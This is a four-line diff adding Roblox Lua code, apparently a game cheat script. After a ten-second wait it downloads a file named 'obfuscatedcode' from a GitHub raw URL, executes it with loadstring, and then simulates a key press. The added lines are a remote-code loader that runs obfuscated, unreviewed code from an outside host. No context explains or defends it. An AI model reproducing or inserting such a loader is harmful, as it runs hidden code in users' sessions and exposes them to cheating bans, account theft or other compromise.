@@ -1,0 +1,4 @@
+spawn(function() wait(10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/4g43/NukeSim1/main/obfuscatedcode"))()
+game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.X,false,game) 
+end)
